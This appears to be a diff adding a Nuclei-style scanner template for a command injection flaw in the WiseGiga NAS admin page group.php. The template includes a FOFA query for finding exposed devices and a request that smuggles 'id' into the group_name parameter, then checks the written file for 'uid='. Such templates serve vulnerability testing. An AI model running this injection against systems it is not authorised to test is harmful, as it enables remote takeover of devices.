@@ -1,0 +1,31 @@
+id: WiseGiga_rce
+info:
+  name: WiseGiga_rce
+  author: changge
+  severity: critical
+  description: WiseGiga NAS 系统group.php存在任意命令执行漏洞，攻击者可以通过执行任意命令，获取服务器管理权限。
+  metadata:
+    max-request: 1
+    fofa-query: title="WiseGiga"
+    verified: true
+  tags: rce
+variables:
+  file_name: "{{to_lower(rand_text_alpha(6))}}.txt"
+
+requests:
+  - raw:
+      - |-
+        GET /admin/group.php?memberid=root&cmd=add&group_name=d;id>{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /admin/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'contains((body_2), "uid=") && status_code_2 == 200'
